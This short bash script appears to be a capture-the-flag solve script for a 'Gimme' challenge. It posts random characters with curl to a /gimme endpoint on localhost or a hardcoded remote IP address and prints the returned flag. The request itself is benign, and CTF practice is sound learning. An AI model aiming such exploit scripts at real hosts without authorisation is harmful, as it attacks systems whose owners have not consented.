#!/bin/bash
PORT=8082

if [[ $1 == "local" ]]
then
    remote='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    remote='http://141.85.224.157:'$PORT
else
    remote=$1':'$2
fi

# Gimme
echo "Start exploit for Gimme"
remote=$remote'/gimme'
data=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 35)
flag=$(curl -s -X POST -H "Content-Type: text/plain" --data $data $remote)
echo "Flag is $flag"
echo "-------------------------"
